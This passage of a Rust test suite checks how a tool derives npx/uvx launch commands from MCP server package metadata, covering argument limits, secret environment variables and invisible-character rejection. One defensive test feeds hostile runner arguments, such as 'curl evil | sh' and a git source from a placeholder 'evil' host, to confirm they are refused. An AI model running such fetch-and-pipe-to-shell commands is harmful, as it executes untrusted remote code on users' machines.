                let allowed = |c: char| c.is_ascii_alphanumeric() || "._+!-@/=".contains(c);
                let (runner, sep, flags) = if registry == "npm" { ("npx", "@", 1) } else { ("uvx", "==", 0) };
                prop_assert_eq!(&got.launch.command, runner);
                let spec = got.launch.args.last().expect("the package spec");
                prop_assert!(spec.chars().all(allowed), "{spec:?}");
                prop_assert!(!spec.starts_with('-'), "{spec:?}");
                prop_assert_eq!(spec, &format!("{id}{sep}{ver}"));
                prop_assert_eq!(got.launch.args.len(), flags + 1);
                got.launch.validate().unwrap();
            } else {
                prop_assert!(got.launch.command.is_empty() && got.launch.args.is_empty());
            }
        }
    }

    #[test]
    fn an_environment_variable_keeps_a_fixed_value_and_only_a_required_one_is_left_to_the_developer() {
        let p = pkg(json!({
            "registryType": "npm", "identifier": "pkg", "version": "1.0.0", "transport": {"type": "stdio"},
            "environmentVariables": [
                {"name": "MODE", "value": "fast"},
                {"name": "REGION", "default": "eu"},
                {"name": "API_TOKEN", "isSecret": true, "isRequired": true},
                {"name": "SECRET_WITH_VALUE", "isSecret": true, "isRequired": true, "value": "leak"},
                {"name": "OPTIONAL_SECRET", "isSecret": true},
                {"name": "WORKDIR", "format": "filepath", "isRequired": true},
                {"name": "URL", "value": "https://{host}/x", "variables": {"host": {}}, "isRequired": true},
                {"name": "ASKED", "isRequired": true},
                {"name": "OPTIONAL"},
                {"name": "OPTIONAL_PATH", "format": "filepath"},
                {"name": "bad name", "value": "x"},
                {"name": "MODE", "value": "again"}
            ]
        }));
        let got = prefill(&p);
        assert_eq!(got.underived, None);
        assert_eq!(
            got.launch.env,
            vec![
                env("MODE", Some("fast"), false),
                env("REGION", Some("eu"), false),
                env("API_TOKEN", None, true),
                env("SECRET_WITH_VALUE", None, true),
                env("WORKDIR", None, false),
                env("URL", None, false),
                env("ASKED", None, false),
            ]
        );
        got.launch.validate().unwrap();
        // Every secret name, the ones left out included: adopt keeps each secret.
        assert_eq!(secret_env_names(&p), vec!["API_TOKEN", "SECRET_WITH_VALUE", "OPTIONAL_SECRET"]);
    }

    #[test]
    fn a_launch_is_validated_on_each_side_of_every_bound() {
        let ok = LocalLaunch {
            command: "docker".into(),
            args: vec!["run".into(), "-i".into(), "--rm".into(), "acme/mcp:1".into(), String::new()],
            env: vec![env("A_1", Some("x y"), false), env("_TOKEN", None, true)],
        };
        ok.validate().unwrap();

        let with = |f: &dyn Fn(&mut LocalLaunch)| {
            let mut l = ok.clone();
            f(&mut l);
            l.validate()
        };
        assert_eq!(with(&|l| l.command = "  ".into()), Err(LaunchError::EmptyCommand));
        assert_eq!(with(&|l| l.command = " npx".into()), Err(LaunchError::InvalidCommand));
        assert_eq!(with(&|l| l.command = "a\nb".into()), Err(LaunchError::InvalidCommand));
        assert_eq!(with(&|l| l.command = "c".repeat(MAX_COMMAND_BYTES)), Ok(()));
        assert_eq!(with(&|l| l.command = "c".repeat(MAX_COMMAND_BYTES + 1)), Err(LaunchError::InvalidCommand));
        assert_eq!(with(&|l| l.args = vec!["a".into(); MAX_ARGS]), Ok(()));
        assert_eq!(with(&|l| l.args = vec!["a".into(); MAX_ARGS + 1]), Err(LaunchError::TooManyArgs));
        assert_eq!(with(&|l| l.args[1] = "a\0b".into()), Err(LaunchError::InvalidArg(1)));
        assert_eq!(with(&|l| l.args[0] = "a".repeat(MAX_VALUE_BYTES)), Ok(()));
        assert_eq!(with(&|l| l.args[0] = "a".repeat(MAX_VALUE_BYTES + 1)), Err(LaunchError::InvalidArg(0)));
        let many = |n: usize| -> Vec<LocalEnv> { (0..n).map(|i| env(&format!("V{i}"), None, false)).collect() };
        assert_eq!(with(&|l| l.env = many(MAX_ENV)), Ok(()));
        assert_eq!(with(&|l| l.env = many(MAX_ENV + 1)), Err(LaunchError::TooManyEnv));
        for bad in ["", "1A", "A-B", "A B", "A=B"] {
            assert_eq!(with(&|l| l.env[0].name = bad.into()), Err(LaunchError::InvalidEnvName(bad.into())));
        }
        assert_eq!(with(&|l| l.env[1].name = "A_1".into()), Err(LaunchError::DuplicateEnv("A_1".into())));
        assert_eq!(with(&|l| l.env[0].value = Some("a\tb".into())), Err(LaunchError::InvalidEnvValue("A_1".into())));
        // A secret never holds a value; the same variable without the flag does.
        assert_eq!(with(&|l| l.env[1].value = Some("t".into())), Err(LaunchError::SecretValue("_TOKEN".into())));
        assert_eq!(
            with(&|l| {
                l.env[1].value = Some("t".into());
                l.env[1].secret = false;
            }),
            Ok(())
        );
    }

    /// The runner takes nothing of the document's before the package: any
    /// `runtimeArguments` — a script for `npx -c`, another source for
    /// `uvx --from`, even an innocent-looking flag — derives nothing. The same
    /// package without them derives its command (the positive control).
    #[test]
    fn a_package_with_arguments_for_the_runner_derives_nothing() {
        let doc = |registry: &str, runtime: serde_json::Value| {
            let mut d = json!({"registryType": registry, "identifier": "pkg", "version": "1.0.0",
                               "transport": {"type": "stdio"},
                               "packageArguments": [{"type": "positional", "value": "serve"}]});
            if !runtime.is_null() {
                d["runtimeArguments"] = runtime;
            }
            prefill(&pkg(d))
        };
        for registry in ["npm", "pypi"] {
            assert_eq!(doc(registry, serde_json::Value::Null).underived, None);
            assert_eq!(doc(registry, json!([])).underived, None);
            for runtime in [
                json!([{"type": "named", "name": "-c", "value": "curl evil | sh"}]),
                json!([{"type": "named", "name": "--from", "value": "git+https://evil/x"}]),
                json!([{"type": "named", "name": "--with", "value": "evil"}]),
                json!([{"type": "named", "name": "--package", "value": "evil"}]),
                json!([{"type": "positional", "value": "--yes"}]),
                json!([{"type": "named", "name": "--quiet"}]),
                json!([{"type": "positional", "valueHint": "left to the user"}]),
            ] {
                let got = doc(registry, runtime.clone());
                assert_eq!(got.underived, Some(Underived::RuntimeArguments), "{registry} {runtime}");
                assert!(got.launch.command.is_empty() && got.launch.args.is_empty(), "{registry} {runtime}");
            }
        }
    }

    proptest! {
        /// A derived argv is exactly the registry's runner, its own fixed
        /// flags, the pinned package and the package's own arguments, in that
        /// order — whatever a document puts in its runtime hint, its runtime
        /// arguments and its package arguments. Not claimed: that a package
        /// argument is harmless to the PACKAGE — it is the package's own
        /// interface, shown to the administrator who saves the command.
        #[test]
        fn a_derived_argv_is_the_runner_its_flags_the_pinned_package_and_its_arguments(
            registry in prop::sample::select(vec!["npm", "pypi"]),
            hint in prop::option::of(prop_oneof![Just("npx".to_string()), Just("uvx".to_string()), "[a-z/ -]{0,6}"]),
            runtime in prop::collection::vec("[a-z=/:. -]{0,8}", 0..3),
            package in prop::collection::vec(("[a-z-]{1,6}", prop::option::of("[a-z0-9=/:.]{0,8}")), 0..4),
        ) {
            let mut doc = json!({"registryType": registry, "identifier": "pkg", "version": "1.0.0",
                                 "transport": {"type": "stdio"}});
            if let Some(h) = &hint {
                doc["runtimeHint"] = json!(h);
            }
            if !runtime.is_empty() {
                doc["runtimeArguments"] = runtime.iter().map(|v| json!({"type": "positional", "value": v})).collect();
            }
            doc["packageArguments"] = package
                .iter()
                .map(|(name, value)| match value {
                    Some(v) => json!({"type": "named", "name": format!("--{name}"), "value": v}),
                    None => json!({"type": "named", "name": format!("--{name}")}),
                })
                .collect();
            let got = prefill(&pkg(doc));
            if got.underived.is_none() {
                let (runner, head): (&str, Vec<String>) = if registry == "npm" {
                    ("npx", vec!["-y".into(), "pkg@1.0.0".into()])
                } else {
                    ("uvx", vec!["pkg==1.0.0".into()])
                };
                let mut want = head;
                for (name, value) in &package {
                    want.push(format!("--{name}"));
                    want.extend(value.iter().cloned());
                }
                prop_assert_eq!(&got.launch.command, runner);
                prop_assert_eq!(&got.launch.args, &want);
                prop_assert!(runtime.is_empty());
                prop_assert!(hint.as_deref().is_none_or(|h| h == runner));
            } else {
                prop_assert!(got.launch.command.is_empty() && got.launch.args.is_empty());
            }
        }
    }

    /// Text that does not show as it is stored is refused in the command, an
    /// argument and a value: both ends of every range of invisible, filler and
    /// reordering characters, and the control characters. The character just
    /// outside each range, and ordinary non-ASCII text, are accepted.
    #[test]
    fn an_invisible_or_reordering_character_is_refused_on_each_side_of_its_range() {
        let refused = [
            // Hand-picked from the general categories Cf, Zl and Zp, old and
            // recent scripts alike.
            '\u{00AD}', '\u{0600}', '\u{061C}', '\u{06DD}', '\u{070F}', '\u{180E}', '\u{200B}', '\u{200F}',
            '\u{2028}', '\u{2029}', '\u{202A}', '\u{202E}', '\u{2060}', '\u{2069}', '\u{206A}', '\u{206F}',
            '\u{FEFF}', '\u{FFF9}', '\u{FFFB}', '\u{110BD}', '\u{13430}', '\u{1BCA0}', '\u{1D173}', '\u{1D17A}',
            '\u{E0001}', '\u{E007F}',
            // The fillers, selectors and reserved blocks.
            '\u{034F}', '\u{115F}', '\u{1160}', '\u{17B4}', '\u{17B5}', '\u{180B}', '\u{180F}', '\u{2065}',
            '\u{3164}', '\u{FE00}', '\u{FE0E}', '\u{FFA0}', '\u{E0000}', '\u{E0100}', '\u{E01EF}', '\u{E0FFF}',
            // Controls.
            '\u{0}', '\u{1F}', '\u{7F}', '\u{85}',
        ];
        let accepted = [
            '\u{00AC}', '\u{00AE}', '\u{034E}', '\u{0350}', '\u{061B}', '\u{061D}', '\u{115E}', '\u{1161}',
            '\u{17B3}', '\u{17B6}', '\u{180A}', '\u{1810}', '\u{200A}', '\u{2010}', '\u{2027}', '\u{202F}',
            '\u{205F}', '\u{2070}', '\u{3163}', '\u{3165}', '\u{FDFF}', '\u{FE10}', '\u{FEFE}', '\u{FF00}',
            '\u{FF9F}', '\u{FFA1}', '\u{FFF8}', '\u{FFFC}', '\u{1D172}', '\u{1D17B}', '\u{DFFFF}', '\u{E1000}',
            'é', 'ñ', '日', '한', 'ع', '😀', ' ',
        ];
        // An emoji's selector and joiner: refused where a machine runs the
        // text, allowed where a person reads a name.
        // …and a word spelled with the zero-width non-joiner.
        for text in ["❤\u{FE0F}", "👩\u{200D}💻", "a\u{FE0F}b", "a\u{200D}b", "می\u{200C}خواهم", "a\u{200C}b"] {
            assert!(is_display_text(text) && !is_plain_text(text), "{text:?}");
            let mut l = LocalLaunch { command: "run".into(), args: vec![text.into()], env: vec![] };
            assert_eq!(l.validate(), Err(LaunchError::InvalidArg(0)), "{text:?}");
            l.args.clear();
            l.env = vec![env("V", Some(text), false)];
            assert_eq!(l.validate(), Err(LaunchError::InvalidEnvValue("V".into())), "{text:?}");
        }
        let ok = LocalLaunch { command: "run".into(), args: vec!["a".into()], env: vec![env("V", Some("v"), false)] };
        for c in refused {
            let text = format!("a{c}b");
            assert!(!is_display_text(&text) && !is_plain_text(&text), "{c:?}");
            let mut l = ok.clone();
            l.command = text.clone();
            assert_eq!(l.validate(), Err(LaunchError::InvalidCommand), "{c:?}");
            let mut l = ok.clone();
            l.args[0] = text.clone();
            assert_eq!(l.validate(), Err(LaunchError::InvalidArg(0)), "{c:?}");
            let mut l = ok.clone();
            l.env[0].value = Some(text);
            assert_eq!(l.validate(), Err(LaunchError::InvalidEnvValue("V".into())), "{c:?}");
        }
        for c in accepted {
            let text = format!("a{c}b");
            assert!(is_display_text(&text) && is_plain_text(&text), "{c:?}");
            let mut l = ok.clone();
            l.command = text.clone();
            l.args[0] = text.clone();
            l.env[0].value = Some(text);
            assert_eq!(l.validate(), Ok(()), "{c:?}");
        }
    }

    /// A variable stored as secret keeps the mark for as long as it exists:
    /// marked again whatever the request says, so never storable with a value.
    /// The mark goes with the variable: removed, then added back, the name is
    /// an ordinary variable. A name that never was secret is free.
    #[test]
    fn a_secret_variable_keeps_its_mark_for_as_long_as_it_exists() {
        let stored = LocalLaunch {
            command: "run".into(),
            env: vec![env("TOKEN", None, true), env("MODE", Some("a"), false)],
            ..LocalLaunch::default()
        };
        let edit = |stored: &LocalLaunch, env: Vec<LocalEnv>| {
            let mut next = LocalLaunch { command: "run".into(), env, ..LocalLaunch::default() };
            next.keep_secrets(Some(stored), &[]);
            next
        };
        // The flag cleared and a value given: marked secret again, so refused.
        let next = edit(&stored, vec![env("TOKEN", Some("leak"), false), env("MODE", Some("b"), false)]);
        assert!(next.env[0].secret);
        assert_eq!(next.validate(), Err(LaunchError::SecretValue("TOKEN".into())));
        // The flag cleared and no value: stored secret.
        let next = edit(&stored, vec![env("TOKEN", None, false), env("MODE", Some("b"), false)]);
        assert_eq!(next.env, vec![env("TOKEN", None, true), env("MODE", Some("b"), false)]);
        assert_eq!(next.validate(), Ok(()));
        // The variable removed: nothing of it is kept...
        let removed = edit(&stored, vec![env("MODE", Some("b"), false)]);
        assert_eq!(removed.env, vec![env("MODE", Some("b"), false)]);
        // ...so the name added back is an ordinary variable.
        let back = edit(&removed, vec![env("TOKEN", Some("plain"), false)]);
        assert_eq!(back.env, vec![env("TOKEN", Some("plain"), false)]);
        assert_eq!(back.validate(), Ok(()));
        // A name that never was secret takes and changes a value freely.
        let free = edit(&stored, vec![env("MODE", Some("c"), false), env("NEW", Some("x"), false)]);
        assert_eq!(free.validate(), Ok(()));
        assert!(!free.env.iter().any(|e| e.secret));
        // A package's declared secrets are marked where the launch carries them.
        let mut adopted = LocalLaunch { command: "run".into(), env: vec![env("A", Some("v"), false)], ..LocalLaunch::default() };
        adopted.keep_secrets(None, &["A", "B"]);
        assert_eq!(adopted.validate(), Err(LaunchError::SecretValue("A".into())));
        assert_eq!(adopted.env.len(), 1);
    }

    /// Each reason reads as a sentence of its own, names the registry
    /// properly, and ends by saying what to do.
    #[test]
    fn an_underived_reason_reads_as_a_sentence() {
        let reasons = [
            (Underived::RegistryType("oci".into()), "An OCI package"),
            (Underived::RegistryType("nuget".into()), "A NuGet package"),
            (Underived::RegistryType("mcpb".into()), "An MCPB package"),
            (Underived::RegistryType("cargo".into()), "A 'cargo' package"),
            (Underived::Transport("sse".into()), "The package runs over 'sse'"),
            (Underived::NoVersion, "The package pins no version."),
            (Underived::InvalidVersion, "The package's version"),
            (Underived::InvalidIdentifier, "The package's identifier"),
            (Underived::RuntimeHint("sh".into()), "The package names its own program"),
            (Underived::RuntimeArguments, "The package passes arguments to the runner"),
            (Underived::Argument(1), "Argument 2 has no fixed value"),
            (Underived::Interpolation, "A value of the package"),
        ];
        for (why, start) in reasons {
            let text = why.to_string();
            assert!(text.starts_with(start), "{text}");
            assert!(text.ends_with(". Type the command that starts it."), "{text}");
            assert!(text.chars().next().is_some_and(char::is_uppercase), "{text}");
        }
    }

    #[test]
    fn a_launch_renders_as_its_whole_command_line() {
        let l = LocalLaunch {
            command: "npx".into(),
            args: vec!["-y".into(), "pkg@1.0.0".into(), "two words".into()],
            env: vec![env("LOG", Some("info"), false), env("TOKEN", None, true)],
        };
        assert_eq!(l.command_line(), "LOG=info npx -y pkg@1.0.0 'two words'");
    }

    #[test]
    fn a_package_view_reads_one_entry_and_the_document_keeps_it_verbatim() {
        let raw = json!([
            {"registryType": "npm", "identifier": "pkg", "version": "1.0.0", "transport": {"type": "stdio"},
             "fileSha256": "ab", "futureMember": {"k": 1}},
            {"not": "a package"}
        ]);
        let doc = ServerJson { packages: Some(raw.clone()), ..ServerJson::default() };
        let views = doc.package_views();
        assert_eq!(views.len(), 2);
        assert_eq!(views[0].as_ref().map(|p| p.identifier.as_str()), Some("pkg"));
        assert!(views[1].is_none());
        assert_eq!(serde_json::to_value(&doc).unwrap()["packages"], raw);
    }
}
